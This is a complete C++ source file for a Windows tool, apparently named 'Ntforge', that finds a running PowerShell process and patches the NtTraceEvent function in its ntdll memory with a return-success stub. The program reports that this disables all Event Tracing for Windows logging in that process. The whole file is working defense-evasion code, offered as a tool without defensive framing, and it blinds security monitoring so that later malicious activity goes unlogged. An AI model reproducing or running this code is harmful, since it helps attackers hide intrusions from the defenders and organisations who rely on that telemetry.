
#include <Windows.h>
#include <iostream>
#include <string>
#include <TlHelp32.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

// Find process ID by name
DWORD FindProcessId(const std::wstring& processName) {
DWORD processId = 0;
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

if (snapshot != INVALID_HANDLE_VALUE) {  
    PROCESSENTRY32W processEntry;  
    processEntry.dwSize = sizeof(processEntry);  

    if (Process32FirstW(snapshot, &processEntry)) {  
        do {  
            if (processName == processEntry.szExeFile) {  
                processId = processEntry.th32ProcessID;  
                break;  
            }  
        } while (Process32NextW(snapshot, &processEntry));  
    }  
    CloseHandle(snapshot);  
}  
return processId;

}

// Get ntdll base address in remote process
HMODULE GetRemoteNtdllBase(HANDLE hProcess) {
HMODULE hMods[1024];
DWORD cbNeeded;

if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {  
    return NULL;  
}  

for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {  
    wchar_t szModName[MAX_PATH];  
    if (GetModuleBaseNameW(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(wchar_t))) {  
        if (_wcsicmp(szModName, L"ntdll.dll") == 0) {  
            return hMods[i];  
        }  
    }  
}  
return NULL;

}

// Patch NtTraceEvent (lower level ETW function)
bool PatchRemoteETW(DWORD processId) {
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
if (!hProcess) {
std::cerr << "[ERROR] Failed to open process. Error: " << GetLastError() << std::endl;
return false;
}

HMODULE remoteNtdllBase = GetRemoteNtdllBase(hProcess);  
if (!remoteNtdllBase) {  
    std::cerr << "[ERROR] Could not find ntdll.dll in remote process" << std::endl;  
    CloseHandle(hProcess);  
    return false;  
}  

HMODULE localNtdll = GetModuleHandleW(L"ntdll.dll");  

// Patch NtTraceEvent - lower level, more comprehensive  
FARPROC localNtTraceEvent = GetProcAddress(localNtdll, "NtTraceEvent");  
if (!localNtTraceEvent) {  
    std::cerr << "[ERROR] Could not find NtTraceEvent locally" << std::endl;  
    CloseHandle(hProcess);  
    return false;  
}  

DWORD64 offset = (DWORD64)localNtTraceEvent - (DWORD64)localNtdll;  
LPVOID remoteNtTraceEvent = (LPVOID)((DWORD64)remoteNtdllBase + offset);  

std::cout << "[INFO] Remote NtTraceEvent address: 0x" << std::hex << (DWORD64)remoteNtTraceEvent << std::dec << std::endl;  

// Patch: XOR EAX,EAX; RET (returns success, does nothing)  
BYTE patch[] = { 0x33, 0xC0, 0xC3 };  

DWORD oldProtect;  
if (!VirtualProtectEx(hProcess, remoteNtTraceEvent, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {  
    std::cerr << "[ERROR] Failed to change memory protection. Error: " << GetLastError() << std::endl;  
    CloseHandle(hProcess);  
    return false;  
}  

SIZE_T bytesWritten;  
if (!WriteProcessMemory(hProcess, remoteNtTraceEvent, patch, sizeof(patch), &bytesWritten)) {  
    std::cerr << "[ERROR] Failed to write patch. Error: " << GetLastError() << std::endl;  
    VirtualProtectEx(hProcess, remoteNtTraceEvent, sizeof(patch), oldProtect, &oldProtect);  
    CloseHandle(hProcess);  
    return false;  
}  

VirtualProtectEx(hProcess, remoteNtTraceEvent, sizeof(patch), oldProtect, &oldProtect);  

// Verify  
BYTE verify[3];  
if (ReadProcessMemory(hProcess, remoteNtTraceEvent, verify, sizeof(verify), &bytesWritten)) {  
    if (verify[0] == 0x33 && verify[1] == 0xC0 && verify[2] == 0xC3) {  
        std::cout << "[SUCCESS] Patch verified." << std::endl;  
        CloseHandle(hProcess);  
        return true;  
    }  
}  

std::cerr << "[ERROR] Patch verification failed" << std::endl;  
CloseHandle(hProcess);  
return false;

}

int main() {
std::cout << "========================================" << std::endl;
std::cout << "     ETW " << std::endl;
std::cout << "  Ntforge" << std::endl;
std::cout << "========================================" << std::endl;

std::cout << "\nSearching for powershell.exe..." << std::endl;  
DWORD pid = FindProcessId(L"powershell.exe");  

if (pid == 0) {  
    std::cerr << "[ERROR] No powershell.exe found" << std::endl;  
    system("pause");  
    return 1;  
}  

std::cout << "[SUCCESS] Found PID: " << pid << std::endl;  

if (PatchRemoteETW(pid)) {  
    std::cout << "\n[SUCCESS] ETW patched successfully in PID: " << pid << std::endl;  
    std::cout << "[INFO] ALL ETW logging is now disabled in this PowerShell process" << std::endl;  
}  
else {  
    std::cerr << "\n[ERROR] Patch failed - Run as Administrator" << std::endl;  
}  

system("pause");  
return 0;

}
